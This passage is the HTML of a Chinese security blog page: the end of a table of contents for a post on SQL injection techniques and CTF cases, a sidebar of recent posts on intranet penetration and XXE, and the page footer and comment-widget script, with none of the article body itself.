href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">延时注入总结</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%90%E5%AD%97%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">逐字注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BENCHMARK"><span class="toc-number">2.</span> <span class="toc-text">BENCHMARK</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF"><span class="toc-number">3.</span> <span class="toc-text">笛卡尔积</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#GET-LOCK"><span class="toc-number">4.</span> <span class="toc-text">GET_LOCK</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RLIKE"><span class="toc-number">5.</span> <span class="toc-text">RLIKE</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%86%99shell"><span class="toc-number"></span> <span class="toc-text">SQL注入写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#into-outfile%E5%86%99shell"><span class="toc-number">1.</span> <span class="toc-text">into outfile写shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%86%99shell"><span class="toc-number">2.</span> <span class="toc-text">日志写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97%E5%86%99shell"><span class="toc-number">3.</span> <span class="toc-text">慢查询日志写shell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#quine%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">quine注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">防御注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4yet-another-mysql-injection"><span class="toc-number">1.</span> <span class="toc-text">第三届第五空间yet_another_mysql_injection</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">排序注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">无列名注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NCTF2022"><span class="toc-number"></span> <span class="toc-text">NCTF2022</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#mod-security%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.</span> <span class="toc-text">mod_security防火墙</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E5%9E%8Bsql"><span class="toc-number"></span> <span class="toc-text">新型sql</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(4)/" title="内网渗透体系建设——权限提升">内网渗透体系建设——权限提升</a><time datetime="2023-04-01T16:00:00.000Z" title="发表于 2023-04-02 00:00:00">2023-04-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(3)/" title="内网渗透体系建设——端口转发与代理">内网渗透体系建设——端口转发与代理</a><time datetime="2023-03-29T16:00:00.000Z" title="发表于 2023-03-30 00:00:00">2023-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透体系建设——内网信息收集">内网渗透体系建设——内网信息收集</a><time datetime="2023-03-27T16:00:00.000Z" title="发表于 2023-03-28 00:00:00">2023-03-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(2)/" title="内网渗透体系建设——基础知识">内网渗透体系建设——基础知识</a><time datetime="2023-03-25T16:00:00.000Z" title="发表于 2023-03-26 00:00:00">2023-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/" title="XXE外部实体注入">XXE外部实体注入</a><time datetime="2023-03-22T16:00:00.000Z" title="发表于 2023-03-23 00:00:00">2023-03-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By micgo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '2t5fYJ95Y61Dyi4xHc3dWgxl-gzGzoHsz',
      appKey: 'UNfGz5zfJGeNX6LS5OyiymLm',
      avatar: 'monsterid',
      serverURLs: 'https://2t5fyj95.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>